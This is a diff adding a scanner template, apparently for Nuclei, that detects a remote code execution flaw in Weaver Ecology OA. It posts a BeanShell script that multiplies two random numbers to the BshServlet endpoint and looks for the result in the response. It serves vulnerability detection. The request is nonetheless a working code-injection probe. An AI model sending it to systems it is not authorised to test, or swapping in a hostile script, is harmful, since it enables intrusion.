@@ -1,0 +1,31 @@
+id: weaver-ecology-oa-bash-servlet-rce
+info:
+  name: Weaver Ecology OA BashServlet RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects potential Remote Code Execution (RCE) vulnerability in Weaver Ecology OA BashServlet.
+  reference:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
+
+variables:
+  r1: '{{rand_int(40000, 44800)}}'
+  r2: '{{rand_int(40000, 44800)}}'
+
+http:
+  - raw:
+      - |
+        POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{to_number(r1)*to_number(r2)}}"
+        part: body
